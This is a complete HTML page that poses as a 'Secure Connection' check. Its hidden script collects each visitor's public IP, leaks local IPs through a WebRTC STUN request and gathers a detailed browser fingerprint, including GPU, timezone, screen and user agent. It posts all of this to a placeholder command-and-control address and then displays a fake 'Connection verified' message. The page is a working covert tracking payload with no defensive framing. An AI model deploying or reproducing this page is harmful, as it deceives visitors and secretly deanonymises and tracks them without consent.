<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Loading...</title>
<style>body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}div{text-align:center}h1{font-size:3em}p{font-size:1.5em}</style>
</head>
<body>
<div><h1>🔐</h1><p>Secure Connection...</p></div>
<script>
(async()=>{
let fp='';let data={};
try{
data.ip=await(await fetch('https://api.ipify.org?format=json')).json();
}catch(e){data.ip='fetch_blocked';}
try{
let rtc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
rtc.createDataChannel('');rtc.createOffer().then(o=>rtc.setLocalDescription(o));
rtc.onicecandidate=e=>{if(e.candidate){
let c=e.candidate.candidate;let ip=c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
if(ip){data.rtcIps=ip;}}};
setTimeout(()=>{rtc.close();sendData(data);},4000);
}catch(e){sendData(data);}
function sendData(d){
let fps={screen:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
platform:navigator.platform,cores:navigator.hardwareConcurrency||1,memory:navigator.deviceMemory||'?',
gpu:(()=>{try{let c=document.createElement('canvas');return c.getContext('webgl').getParameter(37445)}catch(e){return'?'}})()};
let all={...d,...fps,ua:navigator.userAgent,ref:document.referrer,ts:Date.now()};
fetch('https://your-c2-server.com/log',{method:'POST',body:JSON.stringify(all),headers:{'Content-Type':'application/json'}})
.catch(()=>{});document.body.innerHTML='<div><h1>✅</h1><p>Connection verified.</p></div>';
}})();</script></body></html>
